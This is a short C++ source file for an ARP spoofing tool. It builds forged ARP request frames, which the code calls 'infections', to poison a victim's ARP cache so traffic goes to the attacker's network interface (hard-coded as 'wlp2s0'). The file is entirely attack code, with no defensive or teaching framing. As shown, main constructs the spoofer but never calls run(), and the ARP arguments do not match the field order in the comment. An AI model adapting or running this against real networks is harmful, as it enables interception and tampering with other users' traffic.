#include "arpspoof.h"

// ARP(Operation opcode, Ipv4Addr target_ip, Ipv4Addr sender_ip, HWAddr target_hw, HWAddr sender_hw);
Ethernet ArpSpoofer::make_infection(session sess) {
    auto ether = Ethernet(*sess.sender_mac, iface.mac(), Ethernet::EtherType::ARP);
    ether/=ARP(ARP::Operation::REQ, *sess.target_ip, *sess.sender_ip, iface.mac(), *sess.sender_mac);
    return ether;
}

void ArpSpoofer::run() 
{
    for(auto sess : sessions)
    {
        auto e = make_infection(sess);
        arp_sender.send_packet(e.serialize());
    }
}

int main(int argc, char* argv[]) {
    auto ss = session(string(argv[2]), string(argv[3]),string(argv[1]));
    auto ar = ArpSpoofer(string("wlp2s0"), ss);    
}